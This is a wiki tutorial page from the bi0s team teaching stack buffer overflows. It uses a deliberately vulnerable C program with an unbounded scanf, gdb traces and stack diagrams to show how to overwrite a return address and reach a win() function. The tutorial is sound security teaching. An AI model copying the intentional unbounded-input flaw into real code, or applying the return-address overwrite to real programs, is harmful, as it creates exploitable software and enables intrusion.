{% extends "bi0s_main.html" %}
{% block title %}
<title>Smash the Stack - bi0s wiki</title>
{% endblock %}
{% block content %}
{% load static %}
<div class="md-sidebar md-sidebar--secondary" data-md-component="toc" style="height: 527px;">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav class="md-nav md-nav--secondary">
</nav>
</div>
</div>
</div>
<div class="md-content">
<article class="md-content__inner md-typeset">
<a href="https://gitlab.com/teambi0s/bi0s-wiki/blob/master/docs/pwning/stack-overflow/smash-the-stack.md" title="Edit this page" class="md-icon md-content__icon"></a><img name="kl_1567871715096" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
<h1 id="smash-the-stack">Smash the stack<a class="headerlink" href="#smash-the-stack" title="Permanent link">¶</a></h1>
<p>Buffer Overflow refers to a situation when we are able write past the
 size of a variable , which results in change of data near them , When 
this type of overflow occur in the stack it is called a stack overflow .
 With this we can change the value of sensitive variables which are 
adjacent to the overflow , Also since the return address of a function 
is stored on the stack we can change the control flow of the program .</p>
<div class="superfences-tabs">
<input name="__tabs_1" type="radio" id="__tab_1_0" checked="checked">
<label for="__tab_1_0">Source Code</label>
<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23</pre></div></td><td class="code"><div class="codehilite" id="__code_0"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_0 pre, #__code_0 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="cm">/* stack-example.c */</span>

    <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
    <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

    <span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"You Win ! "</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
    <span class="p">{</span>
      <span class="kt">char</span> <span class="n">arr</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
      <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Input  : %s"</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
    <span class="p">{</span>
      <span class="n">vuln</span><span class="p">();</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>
</td></tr></tbody></table></div>
</div>
<p>Binary File : <a href="https://wiki.bi0s.in/pwning/stack-overflow/stack-example">stack-example</a></p>
<p>The above program contains a buffer overflow bug . the size of the 
character array is 0x10 , since the scanf function does not limit the 
amount of input read from then user , if it is greater than 0x10 , it 
will be written after the arr variable . And if we give input large 
enough we can call the <code>win()</code> by changing the return address of the vuln function .</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>While debugging with gdb use the binary file provided , compiling the
 code on your own might change the address of the functions.</p>
</div>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite" id="__code_1"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_1 pre, #__code_1 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">x</span><span class="o">/</span><span class="mi">10</span><span class="nv">i</span> <span class="nv">main</span><span class="o">+</span><span class="mi">11</span>
   <span class="err">0</span><span class="nf">x80484e7</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
   <span class="err">0</span><span class="nf">x80484e9</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="nb">ecx</span>
   <span class="err">0</span><span class="nf">x80484ea</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="err">0</span><span class="nf">x80484ed</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x80484ab</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x80484f2</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x80484f7</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="nf">...</span>
</pre></div>
</td></tr></tbody></table>
<p>When <code>call</code> instruction is executed the address of the next instruction ie, <code>0x80484f2</code> is pushed on to the stack and the eip register is changed to <code>0x80484ab</code> which is the address of vuln function . The return address is stored on the stack so that after the executing of the <code>vuln</code> the execution can be changed to that address , thus the remaining code of main function is executed .
</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="codehilite" id="__code_2"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_2 pre, #__code_2 code"><span class="md-clipboard__message"></span></button><pre><span></span>    ┌──────────────┐
    │              │
    │              │ <span class="o">&lt;</span>─ <span class="nv">ebp</span> 
          ...
    │              │
    │              │
    ├──────────────┤
    │  <span class="mi">0</span><span class="nv">x80484f2</span>   │  <span class="o">&lt;</span>─<span class="nv">esp</span>   : <span class="nv">value</span> <span class="nv">pused</span> <span class="nv">by</span> <span class="nv">the</span> <span class="k">call</span> <span class="nl">instruction</span> <span class="ss">(</span> <span class="nv">return_address</span> <span class="ss">)</span> 
    └──────────────┘

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="mi">3</span><span class="nv">i</span> <span class="mi">0</span><span class="nv">x80484ea</span>
       <span class="mi">0</span><span class="nv">x80484ea</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span>: <span class="nv">sub</span>    <span class="nv">esp</span>,<span class="mi">0</span><span class="nv">x4</span>
       <span class="mi">0</span><span class="nv">x80484ed</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;</span>: <span class="k">call</span>   <span class="nl">0x80484ab</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">&gt;</span>
       <span class="mi">0</span><span class="nv">x80484f2</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span>: <span class="nv">mov</span>    <span class="nv">eax</span>,<span class="mi">0</span><span class="nv">x0</span>
    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">b</span> <span class="o">*</span> <span class="mi">0</span><span class="nv">x80484ed</span>
    <span class="nv">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mi">0</span><span class="nv">x80484ed</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">c</span>
    <span class="nv">Breakpoint</span> <span class="mi">1</span>, <span class="mi">0</span><span class="nv">x080484ed</span> <span class="nv">in</span> <span class="nv">main</span> <span class="ss">()</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="nv">i</span> <span class="mh">$e</span><span class="nv">ip</span>
    <span class="o">=&gt;</span> <span class="mi">0</span><span class="nv">x80484ed</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;</span>: <span class="k">call</span>   <span class="nl">0x80484ab</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">&gt;</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="mi">4</span><span class="nv">wx</span> <span class="mh">$e</span><span class="nv">sp</span>
    <span class="mi">0</span><span class="nv">xffffce20</span>:     <span class="mi">0</span><span class="nv">xf7f9f3dc</span>      <span class="mi">0</span><span class="nv">xffffce40</span>      <span class="mi">0</span><span class="nv">x00000000</span>      <span class="mi">0</span><span class="nv">xf7e04286</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">si</span>
    <span class="mi">0</span><span class="nv">x080484ab</span> <span class="nv">in</span> <span class="nv">vuln</span> <span class="ss">()</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="mi">4</span><span class="nv">wx</span> <span class="mh">$e</span><span class="nv">sp</span>
    <span class="mi">0</span><span class="nv">xffffce1c</span>:     <span class="mi">0</span><span class="nv">x080484f2</span>      <span class="mi">0</span><span class="nv">xf7f9f3dc</span>      <span class="mi">0</span><span class="nv">xffffce40</span>      <span class="mi">0</span><span class="nv">x00000000</span>
                       <span class="o">^</span>
                       <span class="o">|</span><span class="nv">_</span> <span class="k">return</span> <span class="nv">address</span> <span class="nv">pushed</span> <span class="nv">onto</span> <span class="nv">the</span> <span class="nv">stack</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="nv">i</span> <span class="mh">$e</span><span class="nv">ip</span>
    <span class="o">=&gt;</span> <span class="mi">0</span><span class="nv">x80484ab</span> <span class="o">&lt;</span><span class="nv">vuln</span><span class="o">&gt;</span>:    <span class="nv">push</span>   <span class="nv">ebp</span>
</pre></div>
</td></tr></tbody></table><p></p>
<p>Let's see what is happening in the vuln function . </p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite" id="__code_3"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_3 pre, #__code_3 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="err">80484</span><span class="nl">ab:</span>          <span class="nf">push</span>   <span class="nb">ebp</span>
    <span class="err">80484</span><span class="nl">ac:</span>          <span class="nf">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
</pre></div>
</td></tr></tbody></table>
<p>These two instruction is called the function prologue . It initializes a new stack frame for the function . The previous <code>ebp</code> is pushed onto the stack and the <code>ebp</code> is moved to the same position as <code>esp</code> .</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31</pre></div></td><td class="code"><div class="codehilite" id="__code_4"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_4 pre, #__code_4 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="err">┌──────────────┐</span>
    <span class="err">│</span>              <span class="err">│</span>
    <span class="err">├──────────────┤</span>
    <span class="err">│</span> <span class="mi">0</span><span class="n">x0x80484f2</span>  <span class="err">│</span>
    <span class="err">├──────────────┤</span>
    <span class="err">│</span> <span class="n">previous_ebp</span> <span class="err">│</span> <span class="err">─</span><span class="o">&gt;</span> <span class="n">ebp</span> <span class="p">,</span> <span class="n">esp</span>   <span class="p">:</span> <span class="n">Stack</span> <span class="k">after</span> <span class="n">the</span> <span class="k">function</span> <span class="n">prologue</span>
    <span class="err">└──────────────┘</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
    <span class="o">=&gt;</span> <span class="mi">0</span><span class="n">x80484ab</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">ebp</span>
       <span class="mi">0</span><span class="n">x80484ac</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span>
    <span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xffffce28</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
    <span class="mi">0</span><span class="n">x080484ac</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">wx</span> <span class="err">$</span><span class="n">esp</span>
    <span class="mi">0</span><span class="n">xffffce18</span><span class="p">:</span>     <span class="mi">0</span><span class="n">xffffce28</span>      <span class="mi">0</span><span class="n">x080484f2</span>      <span class="mi">0</span><span class="n">xf7f9f3dc</span>      <span class="mi">0</span><span class="n">xffffce40</span>
                       <span class="o">^</span>
                       <span class="o">|</span><span class="n">_</span> <span class="n">ebp</span> <span class="k">is</span> <span class="n">pushed</span> <span class="n">onto</span> <span class="n">the</span> <span class="n">stack</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
    <span class="o">=&gt;</span> <span class="mi">0</span><span class="n">x80484ac</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
    <span class="mi">0</span><span class="n">x080484ae</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span>
    <span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xffffce18</span>                       <span class="cm">/* Now ebp and esp points to the top of the stack */</span>
</pre></div>
</td></tr></tbody></table>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite" id="__code_5"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_5 pre, #__code_5 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="err">80484</span><span class="nl">ae:</span>           <span class="nf">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x18</span>
    <span class="err">80484</span><span class="nl">b1:</span>           <span class="nf">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x8</span>
</pre></div>
</td></tr></tbody></table>
<p>These instruction allocates space in the stack for the local 
variables ( keep in mind that the stack grows from higher address to 
lower address ) </p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite" id="__code_6"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_6 pre, #__code_6 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="err">80484</span><span class="nl">b4:</span>           <span class="nf">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">]</span> 
    <span class="err">80484</span><span class="nl">b7:</span>           <span class="nf">push</span>   <span class="nb">eax</span>           
    <span class="err">80484</span><span class="nl">b8:</span>           <span class="nf">push</span>   <span class="mh">0x804858b</span>
    <span class="err">80484</span><span class="nl">bd:</span>           <span class="nf">call</span>   <span class="mi">8048370</span> <span class="o">&lt;</span><span class="nv">__isoc99_scanf@plt</span><span class="o">&gt;</span>
</pre></div>
</td></tr></tbody></table>
<p>The <code>lea</code> instruction loads the address of <code>ebp-0x18</code> ( address of arr array ) to eax register . This address is then pushed on to the stack . If you examine <code>0x804856b</code> address , it actually points to "%s" . We are going to call the scanf function ( <code>scanf("%s",arr)</code>
 ) , in x86-32 bit the function arguments are stored on the stack in 
reverse order so we first push the address of the local variable arr 
then the address of the <code>"%s"</code> string is pushed . </p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="codehilite" id="__code_7"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_7 pre, #__code_7 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="w">    </span><span class="err">┌──────────────┐</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">              </span><span class="err">│</span><span class="w"></span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mh">0x0</span><span class="n">x80484f2</span><span class="w"> </span><span class="err">│</span><span class="w">  </span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">previous_ebp</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="o">&lt;</span><span class="err">─</span><span class="w"> </span><span class="n">ebp</span><span class="w"></span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">              </span><span class="err">│</span><span class="w"></span>
<span class="w">          </span><span class="p">...</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">              </span><span class="err">│</span><span class="w"></span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">              </span><span class="err">│</span><span class="o">&lt;</span><span class="err">─</span><span class="w">  </span><span class="n">eax</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ebp</span><span class="w"> </span><span class="err">─</span><span class="w"> </span><span class="mh">0x18</span><span class="w"> </span><span class="p">)</span><span class="w"> </span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w">  </span><span class="err">│</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">              </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"></span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w">  </span><span class="err">│</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="n">addr_arr</span><span class="w">    </span><span class="err">│──</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="k">array</span><span class="w"></span>
<span class="w">    </span><span class="err">├──────────────┤</span><span class="w"></span>
<span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mh">0x804858b</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="o">&lt;</span><span class="err">─</span><span class="w"> </span><span class="n">esp</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">points</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nf">format</span><span class="w"> </span><span class="n">string</span><span class="w"> </span>
<span class="w">    </span><span class="err">└──────────────┘</span><span class="w"></span>

<span class="w">    </span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x80484bd</span><span class="w"></span>
<span class="w">    </span><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x80484bd</span><span class="w"></span>
<span class="w">    </span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="w"></span>
<span class="w">    </span><span class="n">Continuing</span><span class="p">.</span><span class="w"></span>

<span class="w">    </span><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x080484bd</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">vuln</span><span class="w"> </span><span class="p">()</span><span class="w"></span>

<span class="w">    </span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">x</span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="err">$</span><span class="n">eip</span><span class="w"></span>
<span class="w">    </span><span class="o">=&gt;</span><span class="w"> </span><span class="mh">0x80484bd</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="k">call</span><span class="w">   </span><span class="mh">0x8048370</span><span class="w"> </span><span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>

<span class="w">    </span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">wx</span><span class="w"> </span><span class="err">$</span><span class="n">esp</span><span class="w"></span>
<span class="w">    </span><span class="mh">0xffffcdf0</span><span class="err">:</span><span class="w">     </span><span class="mh">0x0804858b</span><span class="w">      </span><span class="mh">0xffffce00</span><span class="w">      </span><span class="mh">0xf7ffcd00</span><span class="w">      </span><span class="mh">0x00040000</span><span class="w"></span>
<span class="w">                         </span><span class="o">^</span><span class="w">              </span><span class="o">^</span><span class="w"></span>
<span class="w">         </span><span class="nf">format</span><span class="w"> </span><span class="n">string</span><span class="w">  </span><span class="n">_</span><span class="o">|</span><span class="w">              </span><span class="o">|</span><span class="n">_</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="k">array</span><span class="w"></span>
<span class="w">    </span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">x</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mh">0x0804858b</span><span class="w"></span>
<span class="w">    </span><span class="mh">0x804858b</span><span class="err">:</span><span class="w">      </span><span class="ss">"%s"</span><span class="w"></span>
</pre></div>
</td></tr></tbody></table>
<p>When scanf function is called our input will be saved on the stack 
since the scanf function reads data till carriage return and there is no
 limit check for the input , we can give input which is larger than the 
size of the array . If we give enough input we can actually overwrite 
the return address .
</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20</pre></div></td><td class="code"><div class="codehilite" id="__code_8"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_8 pre, #__code_8 code"><span class="md-clipboard__message"></span></button><pre><span></span>                                           <span class="k">After</span> <span class="n">giving</span> <span class="mi">0</span><span class="n">x20</span> <span class="n">A</span><span class="err">'</span><span class="n">s</span> <span class="k">as</span> <span class="k">input</span> 

    <span class="err">┌──────────────┐</span>               <span class="err">┌──────────────┐</span>
    <span class="err">│</span>              <span class="err">│</span>               <span class="err">│</span>              <span class="err">│</span>
    <span class="err">├──────────────┤</span>               <span class="err">├──────────────┤</span>
    <span class="err">│</span>  <span class="mi">0</span><span class="n">x0x80484f2</span> <span class="err">│</span>               <span class="err">│</span>    <span class="n">AAAA</span>      <span class="err">│</span>
    <span class="err">├──────────────┤</span>               <span class="err">├──────────────┤</span>
    <span class="err">│</span> <span class="n">previous_ebp</span> <span class="err">│</span> <span class="o">&lt;</span><span class="err">─</span> <span class="n">ebp</span>        <span class="err">│</span>    <span class="n">AAAA</span>      <span class="err">│</span> <span class="o">&lt;</span><span class="err">─</span> <span class="n">ebp</span>
    <span class="err">├──────────────┤</span>               <span class="err">├──────────────┤</span>         <span class="err">─</span>
    <span class="err">│</span>              <span class="err">│</span>               <span class="err">│</span>    <span class="n">AAAA</span>      <span class="err">│</span>          <span class="err">│</span>
          <span class="p">...</span>                           <span class="p">....</span>                 <span class="err">│</span>  <span class="mi">0</span><span class="n">x18</span> <span class="n">x</span> <span class="ss">"A"</span>
    <span class="err">│</span>              <span class="err">│</span>               <span class="err">│</span>    <span class="n">AAAA</span>      <span class="err">│</span>          <span class="err">│</span>
    <span class="err">├──────────────┤</span>               <span class="err">├──────────────┤</span>          <span class="err">│</span>
    <span class="err">│</span>              <span class="err">│</span><span class="o">&lt;</span><span class="err">─</span>  <span class="n">eax</span>        <span class="err">│</span>    <span class="n">AAAA</span>      <span class="err">│</span><span class="o">&lt;</span><span class="err">─</span>  <span class="n">eax</span>  <span class="err">─</span>
    <span class="err">│</span>              <span class="err">│</span>  <span class="err">│</span>            <span class="err">│</span>              <span class="err">│</span>  <span class="err">│</span>
    <span class="err">├──────────────┤</span>  <span class="err">│</span>            <span class="err">├──────────────┤</span>  <span class="err">│</span>
    <span class="err">│</span>  <span class="n">addr_arr</span>    <span class="err">│──</span>             <span class="err">│</span>  <span class="n">addr_arr</span>    <span class="err">│──</span>
    <span class="err">├──────────────┤</span>               <span class="err">├──────────────┤</span>
    <span class="err">│</span>  <span class="mi">0</span><span class="n">x804858b</span>   <span class="err">│</span> <span class="o">&lt;</span><span class="err">─</span> <span class="n">esp</span>        <span class="err">│</span>  <span class="mi">0</span><span class="n">x804858b</span>   <span class="err">│</span> <span class="o">&lt;</span><span class="err">─</span> <span class="n">esp</span>
    <span class="err">└──────────────┘</span>               <span class="err">└──────────────┘</span>
</pre></div>
</td></tr></tbody></table><p></p>
<p>The staring of the array is from <code>ebp-0x18</code> thus giving 
0x18 A's we will reach till saved ebp , then next 4 byte will overwrite 
the saved ebp and the next will overwrite the return address . </p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="codehilite" id="__code_9"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_9 pre, #__code_9 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="nv">wx</span> <span class="mh">$eb</span><span class="nv">p</span><span class="o">+</span><span class="mi">0</span><span class="nv">x4</span>
    <span class="mi">0</span><span class="nv">xffffce1c</span>:     <span class="mi">0</span><span class="nv">x080484f2</span>             <span class="cm">/* return address before the overflow */</span>
    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">b</span> <span class="o">*</span> <span class="mi">0</span><span class="nv">x80484da</span>
    <span class="nv">Breakpoint</span> <span class="mi">5</span> <span class="nv">at</span> <span class="mi">0</span><span class="nv">x80484da</span>
    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">c</span>
    <span class="nv">Continuing</span>.
